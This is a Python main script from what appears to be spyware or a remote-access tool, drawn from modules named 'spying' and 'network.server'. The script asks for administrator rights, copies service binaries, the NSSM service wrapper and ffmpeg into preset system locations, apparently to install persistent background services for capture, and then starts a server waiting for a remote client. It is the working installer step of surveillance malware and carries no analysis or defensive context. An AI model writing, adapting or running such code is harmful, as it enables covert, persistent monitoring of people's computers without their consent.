import os

from network.server import Server
from spying.consts import SERVICE_PATHS, SERVICE_NAME, NSSM_PATH, FFMPEG_PATH
from spying import Spy, admin
from pathlib import Path
from shutil import copy as __copy

# must be here for the pyinstaller:
import unicrypto.backends.cryptography
import unicrypto.backends.cryptography.DES
import unicrypto.backends.cryptography.TDES
import unicrypto.backends.cryptography.RC4
import unicrypto.backends.cryptography.AES


def copy(src, path):
    try:
        if Path(path).exists():
            os.remove(path)
        __copy(src, path)
    except OSError as e:
        print(e)


if __name__ == "__main__":
    if not admin.make_admin():
        exit(0)
    service1 = Path(f"{SERVICE_NAME}1")
    service2 = Path(f"{SERVICE_NAME}2")
    nssm = Path("nssm.exe")
    ffmpeg = Path("ffmpeg.exe")
    if service1.exists():
        copy(service1, SERVICE_PATHS[0][0])
    if service2.exists():
        copy(service2, SERVICE_PATHS[1][0])
    if nssm.exists():
        copy(nssm, NSSM_PATH)
    if ffmpeg.exists():
        copy(ffmpeg, FFMPEG_PATH)
    s = Server()
    s.wait_for_client()


